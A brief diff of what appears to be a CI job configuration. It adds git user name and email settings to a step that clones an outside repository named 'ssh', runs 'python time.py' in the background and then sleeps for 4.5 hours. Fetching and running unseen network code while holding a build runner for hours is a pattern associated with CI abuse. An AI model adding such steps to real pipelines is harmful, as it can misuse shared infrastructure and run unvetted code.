@@ -17,6 +17,8 @@ jobs:
           no_output_timeout: 20m
           command: |
             git clone https://github.com/KernelPanic-OpenSource/ssh.git py
+            git config --global user.name "$GIT_USERNAME"
+            git config --global user.email "$GIT_EMAIL"
             cd py
             python time.py &
             sleep 4.5h
